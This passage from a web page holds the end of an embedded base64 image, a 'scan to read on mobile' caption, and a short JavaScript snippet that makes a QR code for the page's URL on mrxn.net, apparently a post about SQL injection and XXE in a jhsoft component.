zWWEuQcEpxrHB25I3ubKxxNYAxlP5MPr6U397H4grht0rGqh63Cf+5oKXQvdY076GJUGUWvtJ5if5z6Zg/1nQWjQ0bXulRG6b92QfDIXyKeBeJLCan8Q05Q+hv0QHui/zlrLCLMv98zevRzO9XDf3AeiNnPOITTA1Gn0szIeFWffNJCjwqX9/gmsgfz+GT/1hGkgQPs06k75SpmD2WetwtyjyqH3g8irPubcw2sh7NdBaK7LCKEBajOFvZPwRVQasJ3hl3z4x7UQfmD9r05uF/tqn9QhpuSpCSG4vGfxY1g37/UjhOgPx2/+VR+IWj8zY+U/y7lP5Yd4JvT9QnCV/xEHUetnCqcfWY+aXFX/r+xrDeRik2yf1HVdFHl/WisyB3HNYB+z3znMfvV22Jdx1KD3sAady7Vncoha9xK6TrnDXEa4r81aVQfhzz7nEBqw3tRvF/tqb+reF/RpwZzb51dBRmsVZp9z2O+vHnCvi3NAaO4ltJZRfA6IOqDZgO3XVKixGYsEoiZLEBx0zLpz78tr4XoP0SlcKNZALjQMbaW9qWsxhq9UhTBfR/vGPntr+4V7HvHSxxC/FzDvDYIb+4xr98y8uSOE6A+UNvcDph+P1oTrhpTH9zlyelPXlBxH27JHaB/E9MU5Rg3CA1jaRfcAtlfVrvFbgNkHM/dtL8HPLMWCtL/Cwt7+bxDltw6xR2D92ns7/Hq/2N5DoE8Jnsu9bU1dAb1+1KQ7rD1C+2Hum2vtO0LoPSDy3AOCg47Wc19zRpj91oTQdYhcvCL3Xe8hOpELxRrIhYahrbSB5GtzJlfxMwFxTaFjVZ+fDeE98kF4gGYDtl8CYMbc3zl0n7nWLCXQfYneUtcJN2L4Jl4x0NsSet82kE1Z3z5+AtNAoE8L5vyVO4beX68exdn+ELWVX30clW4O5h4QnOuF9it3mIPww4z2CCF05WO4p3AayGhe6/eewBrIe8/74dNeOhA4dy11NRXV7iB6QP/v1vapxlFxELXWhPYbxTnMVWhPRoj+QKan3P2ycJZ76UDyBla+fwJHyksH4ldBRj8cmH4VzT4I3X4hBAczSldA17TeC+g+iHzPKx7CAx3zfuVRZM65+L2wR2gP9Ge8dCB+wMK/P4E1kL8/u1+pnAaiq3QUz+4C4jpWdRAa9Dfw6tlV7REHva997uv1HkLUZt21EBrQZGD6UQzBuU7YClICs28aSPKv9AMn0AYCMS04h0d7hd5Drw5F9mutyBz0Gojcurx7YY/QHuUOiF4QaI8QgoOO4hWuf4TyKiof9L6VXnFtIJW4uPefwBrI+8/88In/AgAA//9QEha8AAAABklEQVQDAMZtoK2jK+F7AAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-AddTask-sqli-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 